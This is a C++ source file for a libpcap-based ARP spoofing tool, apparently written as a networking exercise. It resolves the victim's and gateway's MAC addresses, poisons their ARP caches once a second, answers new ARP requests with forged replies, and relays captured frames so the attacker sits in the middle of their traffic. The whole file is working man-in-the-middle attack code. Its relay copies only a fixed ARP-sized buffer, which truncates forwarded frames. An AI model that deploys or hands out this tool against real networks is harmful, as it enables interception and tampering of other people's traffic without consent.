#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <cstring>
#include <map>
#include <thread>
#include <set>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <unistd.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac.h"
#include "get_ip.h"


using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

// attacker's address 전역변수
Mac attackerMac;
Ip attackerIp;

// Network, IpNet, MacNet, senderMacSet
pair<Ip, Mac> Attacker;
map<Ip, Mac> SenderNet;
map<Ip, Mac> TargetNet;
map<Ip, Ip> IpNet;
map<Mac, Mac> MacNet;
set<Mac> senderMacSet;

static mutex mu;
queue<EthArpPacket> packetQueue;
condition_variable queueCV;

pcap_t* handle;
pcap_t* relayhandle;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Mac send_arp_normal(Ip targetIp);
void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp);
void arp_spoofing_thread(Mac senderMac, Ip senderIp, Ip targetIp);
void relay_thread();

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    const char* interf = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
		return -1;
	}

	relayhandle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
	if (relayhandle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
		return -1;
	}

	// interface casting
	string interface = interf;

	attackerMac = get_mac(interface);
	attackerIp = get_ip(interface);
	Attacker = make_pair(attackerIp, attackerMac);

	// make flow each (Sender, Target) pair
	for (int i = 2; i < argc; i += 2) {
		// Sender
		Ip senderIp = Ip(argv[i]); 
		Mac senderMac;
		// Target
		Ip targetIp = Ip(argv[i + 1]);
		Mac targetMac;

		// Sender - SenderNet에 있는 IP인지 확인
		if(SenderNet.find(senderIp)==SenderNet.end()){
			senderMac = send_arp_normal(senderIp);
			SenderNet.insert(make_pair(senderIp, senderMac));
		}
		// SenderNet
		else if(TargetNet.find(senderIp)!=TargetNet.end()){
			senderMac = TargetNet[senderIp];
			SenderNet.insert(make_pair(senderIp, senderMac));
		}

		//Target - TargetNet 있는 IP인지 확인
		if(TargetNet.find(targetIp)==TargetNet.end()){
			targetMac = send_arp_normal(targetIp);
			TargetNet.insert(make_pair(targetIp, targetMac));
		}
		// SenderNet
		else if(SenderNet.find(senderIp)!=SenderNet.end()){
			targetMac = SenderNet[targetIp];
			TargetNet.insert(make_pair(targetIp, targetMac));
		}

		// sender-target Ip / Mac pair
		IpNet.insert(make_pair(senderIp, targetIp));
		MacNet.insert(make_pair(SenderNet[senderIp], TargetNet[targetIp]));

		cout<<static_cast<string>(SenderNet[senderIp])<<" "<<static_cast<string>(TargetNet[targetIp])<<endl;

		// Mac Set
		senderMacSet.insert(senderMac);
		senderMacSet.insert(targetMac);

		send_arp_spoof(SenderNet[senderIp], senderIp, targetIp);
		printf("sent arp spoof - first infection\n");

		// consistently spoofing thread (for each flow)
		// send spoofing packet per second, for prevent unicast... etc
		thread spoofThread(arp_spoofing_thread, senderMac, senderIp, targetIp);
		spoofThread.detach();

		// start relay thread -> relay not arp packet
		thread relayThread(relay_thread);
		relayThread.detach();
	}

	const u_char* cap_packet;
	struct pcap_pkthdr* header;

	// if packet change arp table (ARP request, relpy..)
	while(true){
		// packet capture
		int res = pcap_next_ex(handle, &header, &cap_packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		// check packet
		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);

		 if (ntohs(eth_arp_pkt->eth_.type_) == EthHdr::Arp){
			// if sender and target ip not in the Network 
			Ip senderIp = arp_hdr->sip();
			Mac senderMac = SenderNet[senderIp];
			Ip targetIp = arp_hdr->tip();

			// packet's sip, tip not in Net 
			if(SenderNet.find(senderIp)==SenderNet.end() && TargetNet.find(targetIp)==TargetNet.end()) continue;

			// sip가 센더로 저장되어있고 tip가 센더에 해당되는 ip가 아니라면 continue
			// sip가 제대로 통신할 수 있도록 ARP 리퀘스트는 해야함
			if(SenderNet.find(senderIp)!=SenderNet.end() && IpNet[senderIp]!=targetIp) continue;

			// Sender and Target's Broadcast Request "Who are you??"
			if(arp_hdr->tmac().isBroadcast() && (SenderNet.find(senderIp)!=SenderNet.end()||TargetNet.find(senderIp)!=TargetNet.end())){
				send_arp_spoof(SenderNet[senderIp], senderIp, targetIp);
			}

			// target's reply "You.. Gateway is ME"
			if(arp_hdr->op()==ArpHdr::Reply&&SenderNet.find(targetIp)!=SenderNet.end()){
				send_arp_spoof(SenderNet[targetIp], targetIp,senderIp);
			}

			send_arp_spoof(SenderNet[senderIp], senderIp,targetIp);
			
			senderMacSet.insert(senderMac);
			senderMacSet.insert(TargetNet[targetIp]);
		}
	}
	pcap_close(handle);
	pcap_close(relayhandle);
}

// Get sender's Mac
Mac send_arp_normal(Ip targetIp){
	EthArpPacket packet; //arp request packet

	packet.eth_.smac_ = attackerMac;
	packet.eth_.dmac_ = Mac::broadcastMac(); //broadcast mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(attackerIp);

	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //anyting
	packet.arp_.tip_ = htonl(targetIp);
	
	while (true){
   		int sent = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));                                               

		const u_char* cap_packet;
		struct pcap_pkthdr* header;
		
		int res = pcap_next_ex(handle, &header, &cap_packet);
		
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
	
		//check ARP Packet
		if (eth_arp_pkt->eth_.type() != EthHdr::Arp) continue;
		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
		//Check reply packet
		if(arp_hdr->op()!=ArpHdr::Reply) continue;
		//Check correct sender
		if(arp_hdr->sip()!=targetIp) continue;
		return Mac(static_cast<string>(arp_hdr->smac()));	
	}
	return Mac();
}

// send arp-spoof packet
void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp){
	// printf("sent to.. %s\n", static_cast<string>(senderMac).c_str());
	
	EthArpPacket packet;
	packet.eth_.smac_ = attackerMac;
	packet.eth_.dmac_ = senderMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.op_ = htons(ArpHdr::Request);
	// My mac
	packet.arp_.smac_ = attackerMac;
	// Target ip(gateway)
	packet.arp_.sip_ = htonl(targetIp);

	// Victim
	packet.arp_.tmac_ = senderMac;
	packet.arp_.tip_ = htonl(targetIp);

	// packet loss대비
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	//printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

// consistently send apr_spoof packet
void arp_spoofing_thread(Mac senderMac, Ip senderIp, Ip targetIp) {
	printf("create spoofing thread for %s, %s \n", 
		static_cast<string>(senderIp).c_str(),
		static_cast<string>(targetIp).c_str());

	while (true) {
		send_arp_spoof(senderMac, senderIp, targetIp);
		sleep(1); //1초
	}
}

void relay_send_thread(){
	while(true){
		unique_lock<mutex> lock(mu);
		queueCV.wait(lock);
		while(!packetQueue.empty()){
			EthArpPacket* eth_relay = &packetQueue.front();
			packetQueue.pop();
			// unique_lock<mutex> unlock(mu);

			if (eth_relay->eth_.type() != EthHdr::Arp && MacNet.find(eth_relay->eth_.smac()) != MacNet.end()) {				
				EthArpPacket relay_copy;
				memcpy(&relay_copy, eth_relay, sizeof(EthArpPacket));

				relay_copy.eth_.smac_ = attackerMac;
				relay_copy.eth_.dmac_ = MacNet[eth_relay->eth_.smac()]; //targetMac

				pcap_sendpacket(relayhandle, reinterpret_cast<const u_char*>(&relay_copy), sizeof(EthArpPacket));
				// cout<<"send relay"<<endl;
			}
		}
	}
}

// relay captured pakcet
void relay_thread() {
    const u_char* relaypacket;
    struct pcap_pkthdr* header;

	thread relaySendThread(relay_send_thread);
	relaySendThread.detach();	

    while (1) {
        int res = pcap_next_ex(relayhandle, &header, &relaypacket);

        const EthArpPacket* eth_relay = reinterpret_cast<const EthArpPacket*>(relaypacket);
		
		unique_lock<mutex> lock(mu);
		packetQueue.push(*eth_relay);
		queueCV.notify_one();
    }
}